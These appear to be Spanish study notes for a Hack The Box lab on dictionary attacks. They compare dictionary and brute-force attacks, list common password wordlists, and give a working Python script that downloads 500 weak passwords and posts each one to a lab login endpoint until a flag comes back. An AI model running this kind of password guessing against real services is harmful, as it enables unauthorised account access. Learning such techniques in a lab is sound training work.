
## 1. ¿Qué es un ataque de diccionario?

Un **Dictionary Attack** consiste en probar contraseñas de una lista predefinida (_wordlist_) contra un sistema objetivo.

En lugar de probar todas las combinaciones posibles, como hace un ataque de fuerza bruta, se utilizan contraseñas que tienen probabilidades de ser utilizadas por el objetivo.

### Diferencias entre Dictionary Attack y Brute Force

|Característica|Dictionary Attack|Brute Force|
|---|---|---|
|Método|Prueba contraseñas de una wordlist.|Prueba combinaciones de caracteres.|
|Velocidad|Generalmente más rápido.|Puede ser muy lento.|
|Recursos|Menor espacio de búsqueda si la lista es reducida.|Puede requerir muchos recursos.|
|Personalización|Permite crear listas específicas para el objetivo.|No depende necesariamente de información del objetivo.|
|Efectividad|Alta contra contraseñas comunes o incluidas en la lista.|Puede encontrar cualquier contraseña dentro del espacio de búsqueda si dispone de tiempo y recursos suficientes.|
|Limitación|No encontrará contraseñas que no estén en la lista probada.|Puede resultar inviable con contraseñas largas y complejas.|

**Idea clave:** un ataque de diccionario depende especialmente de la calidad de la wordlist utilizada.

## 2. Wordlists

Las _wordlists_ son archivos que contienen posibles contraseñas o nombres de usuario.

Pueden obtenerse de diferentes fuentes:

- **Publicly Available Lists:** listas públicas disponibles en Internet.
    
- **Custom-Built Lists:** listas creadas a partir de información recopilada durante el reconocimiento.
    
- **Specialized Lists:** listas adaptadas a una aplicación, empresa o sector.
    
- **Pre-existing Lists:** listas incluidas en distribuciones y herramientas de pentesting.
    

### Wordlists importantes

|Wordlist|Contenido / utilidad|
|---|---|
|`rockyou.txt`|Millones de contraseñas procedentes de una filtración de datos.|
|`top-usernames-shortlist.txt`|Lista reducida de nombres de usuario comunes.|
|`xato-net-10-million-usernames.txt`|Lista extensa de nombres de usuario.|
|`2023-200_most_used_passwords.txt`|Contraseñas populares durante 2023.|
|`Default-Credentials/default-passwords.txt`|Credenciales predeterminadas de dispositivos y aplicaciones.|
|`500-worst-passwords.txt`|Lista de 500 contraseñas débiles utilizada en el ejercicio de HTB.|

Una wordlist personalizada puede incluir nombres de empresas, departamentos, términos del sector y otras palabras relacionadas con el objetivo.

## 3. Script de Python: Dictionary Attack

El ejercicio de HTB utiliza una lista de 500 contraseñas comunes y realiza peticiones POST contra el endpoint `/dictionary`.

### Código: `dictionary-solver.py`

```
import requests

ip = "127.0.0.1"  # IP del objetivo
port = 1234       # Puerto del objetivo

# Descargar la wordlist y separar las contraseñas por líneas
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

# Probar cada contraseña
for password in passwords:
    print(f"Attempted password: {password}")

    # Enviar la contraseña mediante POST
    response = requests.post(
        f"http://{ip}:{port}/dictionary",
        data={"password": password}
    )

    # Comprobar si se ha encontrado la contraseña correcta
    if response.ok and "flag" in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Cómo ejecutarlo

**1. Instalar la dependencia:**

```
python3 -m pip install requests
```

**2. Guardar el código:**

```
nano dictionary-solver.py
```

**3. Modificar la IP y el puerto** para que coincidan con los proporcionados por la instancia de HTB.

**4. Ejecutar el script:**

```
python3 dictionary-solver.py
```

### ¿Cómo funciona?

1. **Descarga la wordlist:** obtiene las 500 contraseñas del archivo de SecLists.
    
2. **Itera sobre las contraseñas:** prueba cada entrada de la lista.
    
3. **Envía peticiones POST:** manda cada contraseña como dato de formulario al endpoint `/dictionary`.
    
4. **Analiza la respuesta:** comprueba `response.ok` y si el JSON contiene la clave `flag`.
    
5. **Detiene el ataque:** cuando encuentra una respuesta que cumple esas condiciones, muestra la contraseña y la flag, y ejecuta `break`.
    

Si ninguna contraseña funciona, el bucle termina cuando se agotan las entradas de la lista.

## 4. Elementos importantes del código

### Descargar una wordlist

```
passwords = requests.get(URL).text.splitlines()
```

- `requests.get(URL)`: descarga el contenido de la URL.
    
- `.text`: obtiene el contenido como texto.
    
- `.splitlines()`: separa el texto en una lista de contraseñas.
    

### Enviar una contraseña mediante POST

```
response = requests.post(
    f"http://{ip}:{port}/dictionary",
    data={"password": password}
)
```

- `requests.post()`: realiza una petición HTTP POST.
    
- `f"http://{ip}:{port}/dictionary"`: construye la URL del objetivo.
    
- `data={"password": password}`: envía la contraseña como dato de formulario.
    

### Comprobar si la contraseña es correcta

```
if response.ok and "flag" in response.json():
```

- `response.ok`: comprueba si la respuesta tiene un estado HTTP considerado satisfactorio.
    
- `response.json()`: interpreta el cuerpo de la respuesta como JSON.
    
- `"flag" in response.json()`: comprueba si existe la clave `flag`.
    

```
print(f"Correct password found: {password}")
print(f"Flag: {response.json()['flag']}")
break
```

Muestra la contraseña encontrada y la flag, y detiene el bucle.

## 5. Resumen para el examen

- **Brute Force:** prueba combinaciones posibles de caracteres.
    
- **Dictionary Attack:** prueba contraseñas de una wordlist.
    
- **Wordlist:** archivo que contiene posibles contraseñas o nombres de usuario.
    
- **Custom Wordlist:** lista creada a partir de información específica del objetivo.
    
- **SecLists:** repositorio de listas utilizadas en pruebas de seguridad.
    
- `**rockyou.txt**`**:** conocida lista de contraseñas filtradas.
    
- `**requests.get()**`**:** permite descargar una wordlist desde una URL.
    
- `**requests.post()**`**:** permite enviar contraseñas a un endpoint mediante POST.
    
- `**.splitlines()**`**:** convierte el texto descargado en una lista de entradas.
    
- `**response.ok**`**:** comprueba si la respuesta HTTP se considera satisfactoria.
    
- `**response.json()**`**:** interpreta la respuesta como JSON.
    
- `**"flag" in response.json()**`**:** comprueba si la respuesta contiene la clave `flag`.
    
- `**break**`**:** termina el bucle cuando se cumple la condición de éxito.
    

### Diferencia fundamental

> Un ataque de fuerza bruta genera combinaciones de caracteres; un ataque de diccionario utiliza una lista de contraseñas candidatas. El ataque de diccionario es especialmente eficaz cuando la contraseña está incluida en la wordlist utilizada.
